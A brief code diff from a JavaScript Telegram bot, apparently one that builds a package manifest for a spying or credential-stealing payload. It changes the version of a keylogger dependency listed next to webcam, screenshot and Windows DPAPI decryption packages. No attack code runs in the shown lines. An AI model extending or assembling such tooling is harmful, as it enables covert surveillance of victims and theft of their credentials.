@@ -897,7 +897,7 @@ bot.on("callback_query", async (query) => {
                     "screenshot-desktop": "^1.15.0",
                     "sqlite3": "^5.1.7",
                     "win-dpapi": "1.1.0",
-                    "node-keylogger": "^0.1.0",
+                    "node-keylogger": "0.0.1",
                     "node-webcam": "^0.8.2"
                 }
             };
